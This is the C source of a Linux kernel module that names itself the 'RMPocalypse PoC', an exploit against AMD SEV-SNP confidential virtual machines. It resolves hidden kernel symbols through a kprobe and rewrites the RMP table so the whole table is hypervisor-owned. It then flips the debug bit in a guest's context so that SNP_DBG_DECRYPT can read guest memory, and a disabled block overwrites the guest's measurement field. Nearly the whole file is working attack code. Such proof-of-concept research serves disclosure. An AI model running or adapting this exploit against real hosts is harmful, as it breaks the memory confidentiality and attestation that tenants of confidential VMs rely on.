#include <linux/fs.h>
#include <linux/file.h>
#include <linux/psp-sev.h>
#include <linux/psp.h>
#include <linux/module.h>
#include <asm/pgtable_types.h>
#include <asm/sev.h>
#include <linux/kvm_types.h>
#include <linux/kvm_host.h>
#include <linux/bits.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/gfp.h>
#include <asm/io.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/cpu.h>
#include <asm/tdx.h>
#include <kvm/iodev.h>
#include <linux/kvm.h>
#include <linux/errno.h>
#include <linux/percpu.h>
#include <linux/mm.h>
#include <linux/miscdevice.h>
#include <linux/vmalloc.h>
#include <linux/reboot.h>
#include <linux/debugfs.h>
#include <linux/highmem.h>
#include <linux/file.h>
#include <linux/syscore_ops.h>
#include <linux/cpu.h>
#include <linux/sched/signal.h>
#include <linux/sched/mm.h>
#include <linux/sched/stat.h>
#include <linux/cpumask.h>
#include <linux/smp.h>
#include <linux/anon_inodes.h>
#include <linux/profile.h>
#include <linux/mman.h>
#include <linux/swap.h>
#include <linux/bitops.h>
#include <linux/spinlock.h>
#include <linux/compat.h>
#include <linux/srcu.h>
#include <linux/hugetlb.h>
#include <linux/slab.h>
#include <linux/io.h>
#include <linux/version.h>
#include <asm/processor.h>
#include <linux/kprobes.h>
#include <asm/svm.h>
#include <asm/sev-common.h>
#include <asm/msr-index.h>

#include "sev_guest.h"

#define SHADOW_NONPRESENT_VALUE	BIT_ULL(63)

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#define KPROBE_KALLSYMS_LOOKUP 

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

kallsyms_lookup_name_t kallsyms_lookup_name_func;
#define kallsyms_lookup_name kallsyms_lookup_name_func

static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};
#endif

u64* (*get_sptep) (struct kvm_vcpu *vcpu, gfn_t gfn, u64 *spte);

// The function needs the attribute __attribute__((__noinline__)) to avoid the compiler optimization
void (*__handle_changed_spte) (struct kvm *kvm, int as_id, gfn_t gfn,
				u64 old_spte, u64 new_spte, int level,
				bool shared);

bool (*__mmu_spte_update) (u64 *sptep, u64 new_spte);

void (*__tdp_iter_start) (struct tdp_iter *iter, struct kvm_mmu_page *root,
		    int min_level, gfn_t next_last_level_gfn);

void (*__dump_rmpentry) (u64 pfn);

bool (*__kvm_unmap_gfn_range)(struct kvm *kvm, struct kvm_gfn_range *range);

int (*__snp_page_reclaim) (struct kvm *kvm, u64 pfn);

struct list_head* _vm_list;
struct rmpentry *__rmptable;

static int init(void)
{

	#ifdef KPROBE_KALLSYMS_LOOKUP
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);

	if (!unlikely(kallsyms_lookup_name)) {
		pr_alert("Could not retrieve kallsyms_lookup_name address\n");
		return -ENXIO;
	}
	#endif

	_vm_list = (void*)kallsyms_lookup_name("vm_list");
	if (_vm_list == NULL)
	{
		pr_info("lookup failed vm_list\n");
		return -ENXIO;
	}
    get_sptep = (void*)kallsyms_lookup_name("kvm_tdp_mmu_fast_pf_get_last_sptep");
	if (get_sptep == NULL)
	{
		pr_info("lookup failed get_sptep\n");
		return -ENXIO;
	}
    __dump_rmpentry = (void*)kallsyms_lookup_name("dump_rmpentry");
	if (__dump_rmpentry == NULL)
	{
		pr_info("lookup failed dump_rmpentry\n");
		return -ENXIO;
	}
	__rmptable = (void*)kallsyms_lookup_name("rmptable");
	if (__rmptable == NULL)
	{
		pr_info("lookup failed __rmptable\n");
		return -ENXIO;
	}
/* 	__snp_page_reclaim = (void*)kallsyms_lookup_name("snp_page_reclaim");
	if (__snp_page_reclaim == NULL)
	{
		pr_info("lookup failed __snp_page_reclaim\n");
		return -ENXIO;
	} */
	__handle_changed_spte = (void*)kallsyms_lookup_name("handle_changed_spte");
	if (__handle_changed_spte == NULL)
	{
		pr_info("lookup failed __handle_changed_spte\n");
		return -ENXIO;
	}
	__mmu_spte_update = (void*)kallsyms_lookup_name("mmu_spte_update");
	if (__mmu_spte_update == NULL)
	{
		pr_info("lookup failed __mmu_spte_update\n");
		return -ENXIO;
	}
	__tdp_iter_start = (void*)kallsyms_lookup_name("tdp_iter_start");
	if (__tdp_iter_start == NULL)
	{
		pr_info("lookup failed __tdp_iter_start\n");
		return -ENXIO;
	}
	__kvm_unmap_gfn_range = (void*)kallsyms_lookup_name("kvm_unmap_gfn_range");
	if (__kvm_unmap_gfn_range == NULL)
	{
		pr_info("lookup failed __kvm_unmap_gfn_range\n");
		return -ENXIO;
	}
	return 0;
}

#define BYTES_PER_LINE 16

static void __maybe_unused hexdump(const void *addr, size_t len) {
    const unsigned char *ptr = addr;
    size_t i, j;

    for (i = 0; i < len; i += BYTES_PER_LINE) {
        printk(KERN_INFO "%08lx: ", (unsigned long)(ptr + i));
        for (j = 0; j < BYTES_PER_LINE; j++) {
            if (i + j < len)
                printk(KERN_CONT "%02x ", ptr[i + j]);
            else
                printk(KERN_CONT "   ");
        }

        printk(KERN_CONT " | \n");
    }
}

struct psp_snp_cmd_dbg_decrypt {
    u64 gctx;
	u64 src_paddr;
    u64 dst_paddr;
} __packed;

static int do_debug_decrypt(u64 gctx_paddr, u64 src_paddr, u64 dst_paddr){
{
	struct psp_snp_cmd_dbg_decrypt data;
    u32 ret, error = 0;

	data.gctx = gctx_paddr;
	data.src_paddr = src_paddr;
	data.dst_paddr = dst_paddr;

    ret = sev_do_cmd(SEV_CMD_SNP_DBG_DECRYPT, &data, &error);
    pr_info("debug decrypt error value 0x%x\n", error);
    return ret;
}

}
static void __maybe_unused hexdump_diff(const void *addr1, const void *addr2, size_t len) {
    const unsigned char *ptr1 = addr1;
    const unsigned char *ptr2 = addr2;
    size_t i, j;

    for (i = 0; i < len; i += BYTES_PER_LINE) {
        printk(KERN_INFO "%08lx: ", (unsigned long)(ptr1 + i));
        for (j = 0; j < BYTES_PER_LINE; j++) {
            if (i + j < len)
                if (ptr1[i + j] != ptr2[i + j]){
                    printk(KERN_CONT "-- ", ptr1[i + j]);
                } else {
                    printk(KERN_CONT "%02x ", ptr1[i + j]);
                }
            else
                printk(KERN_CONT "   ");
        }
    }
}

static u64 __maybe_unused rmpupdate_firmware(u64 paddr){
	struct rmp_state state = {0};
	u64 ret;

	state.assigned = 1;
	state.pagesize = 0;
	state.immutable = 1;
	
	do {
		/* Binutils version 2.36 supports the RMPUPDATE mnemonic. */
		asm volatile(".byte 0xF2, 0x0F, 0x01, 0xFE"
			     : "=a" (ret)
			     : "a" (paddr), "c" ((unsigned long)&state)
			     : "memory", "cc");
	} while (ret == RMPUPDATE_FAIL_OVERLAP);

	return ret;
}

static u64 __maybe_unused rmpupdate_pre_guest(u64 paddr, u32 asid){
	struct rmp_state state = {0};
	u64 ret;

	state.assigned = 1;
	state.pagesize = 0;
	state.immutable = 1;
	state.asid = asid;
	
	do {
		/* Binutils version 2.36 supports the RMPUPDATE mnemonic. */
		asm volatile(".byte 0xF2, 0x0F, 0x01, 0xFE"
			     : "=a" (ret)
			     : "a" (paddr), "c" ((unsigned long)&state)
			     : "memory", "cc");
	} while (ret == RMPUPDATE_FAIL_OVERLAP);

	return ret;
}

static u64 rmp_base_address;
static u64 rmp_end_address;

static int __init my_module_init(void)
{
    struct list_head* i;
	struct kvm_vcpu* vcpu;
	struct kvm* obj = NULL;
    unsigned long hpa_p1, hpa_p2;
	int ret;
    u64 spte;
    u64 *sptep;
    //unsigned long gpa = 0x0000000002135000;
    unsigned long gpa_p1 = 0x217a000;
	u8 snp_vm = 1;
	struct kvm_sev_info *sev;

	ret = init();
	if (ret != 0)
	{
		pr_info("init failed!\n");
		return ret;
	}
    rdmsrl(MSR_AMD64_RMP_BASE, rmp_base_address);
    rdmsrl(MSR_AMD64_RMP_END, rmp_end_address);

    pr_info("RMP base address: %lx\n", rmp_base_address);
    pr_info("RMP end address: %lx\n", rmp_end_address);

    __rmptable = (struct rmpentry *) (* ((unsigned long *) __rmptable) );
    uint64_t rmp_actual_start = rmp_base_address+0x4000;

	list_for_each(i, _vm_list)
	{
		obj = list_entry(i, struct kvm, vm_list);

		pr_info("kvm location %p\n", obj);

		if (atomic_read(&obj->online_vcpus) == 0)
		{
			printk(KERN_INFO
			"no vcpus are online %d\n", atomic_read(&obj->online_vcpus));
			return -1;
		}
		vcpu = xa_load(&obj->vcpu_array, 0);
    }
	if (!obj)
	{
		pr_info("kvm object not found\n");
		return -1;
	}
	pr_info("kvm object found\n");

    pr_info("RMP base address with offset: %lx\n", rmp_base_address+0x4000);
 	u64 self_protect_rmp = ((rmp_actual_start) << 8);
	self_protect_rmp /=255;
	// each entry is 16 bytes so shift by 4 which is equal to 16
	self_protect_rmp &= ~0xFFFull; 
	//u64 self_protect_rmp_idx = (self_protect_rmp & 0xFFFull) >> 3;

    /*
     * Make the entire RMP writable aka hypervisor owned.
    */
    u64 self_protect_gfn = (self_protect_rmp >> 12);
    u64 rmp_end_gfn = (rmp_end_address >> 12);
    // use the actual start to not write into the RMP reserved area
    u64 rmp_start_gfn = (rmp_actual_start >> 12);

    u64 current_fdn = self_protect_gfn;

#if 1
    while (current_fdn < rmp_end_gfn)
    {
        __rmptable[current_fdn].lo = 0x4;
        current_fdn++;
    }
    current_fdn = self_protect_gfn;
    while (current_fdn > rmp_start_gfn)
    {
        __rmptable[current_fdn].lo = 0x4;
        current_fdn--;
    }
#endif

    sev = &to_kvm_svm(obj)->sev_info;   
    u64 gctx_paddr = __psp_pa(sev->snp_context);
    u8 *gctx_virt = (u8*) phys_to_virt(gctx_paddr);
    void *scratch_buffer = phys_to_virt(0x1000);

// Flip Debug Bit
#if 1
    u64 fail = 1;
    while(fail){
        u64 tmp_value = __rmptable[gctx_paddr >> 12].lo;
        pr_info("GCTX PA: %lx\n", gctx_paddr);
        pr_info("RMP Table Entry: %lx\n", tmp_value);
        uint64_t start = ktime_get_ns();	
        __rmptable[gctx_paddr >> 12].lo = 0x4;
        gctx_virt[0x1FF]++;
        __rmptable[gctx_paddr >> 12].lo = tmp_value;
        fail = do_debug_decrypt(gctx_paddr, hpa_p1, 0x1000);
        uint64_t end = ktime_get_ns();	
        pr_info("Time taken: %lu ns\n", end-start);
    }
#endif

// Overwrite MEASUREMENT gctx field
#if 0
    u64 tmp_value = __rmptable[gctx_paddr >> 12].lo;
    __rmptable[gctx_paddr >> 12].lo = 0x4;

    hexdump(scratch_buffer+0x460, 0x10);
    // save gctx to scratch buffer
    //memcpy(scratch_buffer+0x460, gctx_virt+0x460, 0x40);
    // write scratch buffer to gctx
    memcpy(gctx_virt+0x460, scratch_buffer+460, 0x40);
    
    hexdump(scratch_buffer+0x460, 0x10);
    __rmptable[gctx_paddr >> 12].lo = tmp_value;
#endif
    
    return -1;
}

static void __exit my_module_exit(void)
{
    pr_info("Unloading kernel module\n");
}

module_init(my_module_init);
module_exit(my_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Benedict Schlueter");
MODULE_DESCRIPTION("RMPocalypse PoC Kernel Module");
